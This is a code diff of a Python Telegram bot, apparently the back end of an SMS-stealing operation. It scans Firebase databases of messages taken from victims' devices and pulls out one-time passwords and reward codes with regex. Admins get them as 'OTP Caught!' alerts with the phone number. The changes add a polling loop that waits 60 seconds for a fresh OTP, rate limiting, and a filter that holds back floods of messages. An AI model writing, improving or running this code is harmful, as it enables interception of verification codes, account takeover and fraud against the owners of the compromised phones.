@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""Big City Reward Bot — Firebase + Telegram, multi-admin"""
+"""Big City Reward Bot — Firebase + Telegram (Anti-Spam)"""
 
 import json, os, re, sys, time, threading, html, uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -35,6 +35,7 @@ POLL_LAST = 10
 WORKERS   = 20
 
 OTP_PATTERNS = [
+    re.compile(r"OTP to register is\s*(\d{7})", re.I),
     re.compile(r"OTP[^\d]{0,15}(\d{4,8})", re.I),
     re.compile(r"(\d{4,8})[^\d]{0,15}OTP", re.I),
     re.compile(r"\b(\d{6,7})\b"), 
@@ -177,7 +178,6 @@ def scan_db(session, base, key, last, code_len):
                 if not text.strip(): continue
                 msgs += 1
                 if is_hit(sender, text):
-                    # If phone not in clients, try to find in the message payload
                     phone = phones.get(did, "")
                     if not phone: phone = extract_phone(m)
                     
@@ -447,39 +447,39 @@ class GoldBot:
             if not ctx:
                 return self.answer_cb(cq["id"], "❌ Context expired. Wait for a new code.", show_alert=True)
 
-            self.answer_cb(cq["id"], "🔍 Fetching latest OTP...")
-            
-            ok, msgs = fb_get(self.session, ctx["db"], f"messages/{ctx['device']}.json?orderBy=\"$key\"&limitToLast=20", ctx["key"])
-            if not ok or not isinstance(msgs, dict):
-                return self.send(cid, "❌ Firebase error while fetching OTP.")
+            self.answer_cb(cq["id"], "⏳ Waiting 60s for new OTP...")
+            threading.Thread(target=self._wait_for_otp, args=(cid, ctx)).start()
 
-            otp_found = ""
-            otp_text = ""
-            for mk in sorted(msgs.keys(), reverse=True):
-                m = msgs[mk]
-                if not isinstance(m, dict): continue
-                t = str(m.get("message", "") or m.get("body", "") or m.get("text", ""))
-                
-                if re.search(r"reward\s*code", t, re.I): continue
+    def _wait_for_otp(self, cid, ctx):
+        start_time = time.time()
+        while time.time() - start_time < 60:
+            ok, msgs = fb_get(self.session, ctx["db"], f"messages/{ctx['device']}.json?orderBy=\"$key\"&limitToLast=10", ctx["key"])
+            if ok and isinstance(msgs, dict):
+                for mk in sorted(msgs.keys(), reverse=True):
+                    if mk <= ctx["msgid"]: break
                     
-                o = extract_otp(t)
-                if o:
-                    otp_found = o
-                    otp_text = t
-                    break
+                    m = msgs[mk]
+                    if not isinstance(m, dict): continue
+                    t = str(m.get("message", "") or m.get("body", "") or m.get("text", ""))
+                    
+                    if re.search(r"reward\s*code", t, re.I): continue
+                        
+                    o = extract_otp(t)
+                    if o:
+                        if ctx['phone']:
+                            phone_disp = f"+91 <code>{html.escape(ctx['phone'])}</code>"
+                        else:
+                            phone_disp = f"⚠️ <i>Unknown</i>"
+                            
+                        self.send(cid, f"🔑 <b>OTP Caught!</b>\n\n"
+                                       f"📱 <b>Number:</b> {phone_disp}\n"
+                                       f"🔢 <b>OTP:</b> <code>{html.escape(o)}</code>\n\n"
+                                       f"<i>Msg: {html.escape(t[:200])}</i>\n\n{self.brand()}")
+                        return
             
-            if otp_found:
-                if ctx['phone']:
-                    phone_disp = f"+91 <code>{html.escape(ctx['phone'])}</code>"
-                else:
-                    phone_disp = f"⚠️ <i>Unknown</i> (ID: <code>{html.escape(ctx['device'][:10])}...</code>)"
-                    
-                self.send(cid, f"🔑 <b>OTP Caught!</b>\n\n"
-                               f"📱 <b>Number:</b> {phone_disp}\n"
-                               f"🔢 <b>OTP:</b> <code>{html.escape(otp_found)}</code>\n\n"
-                               f"<i>Msg: {html.escape(otp_text[:200])}</i>\n\n{self.brand()}")
-            else:
-                self.send(cid, f"📭 No OTP found yet for this number.\nTry again after a few seconds.\n\n{self.brand()}")
+            time.sleep(5)
+            
+        self.send(cid, f"❌ <b>Timeout!</b>\n60 second tak naya OTP nahi aaya.\n\n{self.brand()}")
 
     def deliver(self, h):
         if not h["reward"]: return
@@ -510,6 +510,7 @@ class GoldBot:
         if self.super_admin: targets.add(self.super_admin)
         for uid in targets:
             self.send(uid, text, reply_markup=markup)
+            time.sleep(0.2) # <--- TELEGRAM RATE LIMIT PROTECTION
 
         self.log_reward(h)
 
@@ -523,6 +524,8 @@ class GoldBot:
         if not self.scan_lock.acquire(blocking=False): return
         try:
             self.last_scan = time.time()
+            all_fresh = []
+            
             for d in list(self.dbs):
                 base = d["url"]; key = d.get("key", "")
                 last = BASE_LAST if is_startup else POLL_LAST
@@ -532,12 +535,23 @@ class GoldBot:
                     print(f"[scan] {base[:40]}: {e}"); continue
                 
                 fresh = [h for h in hits if h["key"] not in self.seen]
+                all_fresh.extend(fresh)
                 
-                for h in sorted(fresh, key=lambda x: x["msgid"]):
-                    self.seen.add(h["key"])
-                    if not is_startup: self.deliver(h)
-                
+                for h in fresh: self.seen.add(h["key"])
                 if fresh: save_seen(self.seen)
+
+            # ANTI-SPAM LOGIC: Agar 10 se zyada messages ek saath aaye hain
+            if len(all_fresh) > 10:
+                if not is_startup:
+                    self.send(self.super_admin, f"🚨 <b>SPAM ALERT!</b>\n\nEk saath <b>{len(all_fresh)}</b> naye messages aaye hain (SMS Bombing). Maine un sabko block kar diya hai taaki aapka Telegram spam na ho.\n\n{self.brand()}")
+                    # Log them in file but don't send to Telegram individually
+                    for h in all_fresh:
+                        if h["reward"]: self.log_reward(h)
+            else:
+                if not is_startup:
+                    for h in sorted(all_fresh, key=lambda x: x["msgid"]):
+                        self.deliver(h)
+
         finally:
             self.scan_lock.release()
 
